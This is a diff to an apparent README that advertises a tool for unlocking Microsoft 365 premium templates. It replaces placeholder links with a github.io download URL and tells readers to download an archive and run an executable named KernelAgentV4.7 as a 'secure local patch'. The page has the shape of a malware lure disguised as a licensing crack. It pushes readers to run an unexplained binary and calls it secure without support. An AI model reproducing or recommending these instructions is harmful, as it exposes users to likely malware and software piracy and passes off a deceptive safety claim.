@@ -2,13 +2,15 @@
 
 Gain access to Microsoft 365’s professionally designed premium templates for Word, Excel, and PowerPoint. This tool enables all locked templates for personal and business use using a secure local patch with KernelAgentV4.7.
 
-[![Download Premium Templates](https://img.shields.io/badge/Download-Premium_Templates-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Premium Templates](https://img.shields.io/badge/Download-Premium_Templates-blueviolet)](https://m365-premium-templates-unlocker.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-premium-templates-unlocker.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\PremiumTemplates`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate premium template library  
 4. 🧾 Open Word, Excel, or PowerPoint → click “More Templates”  
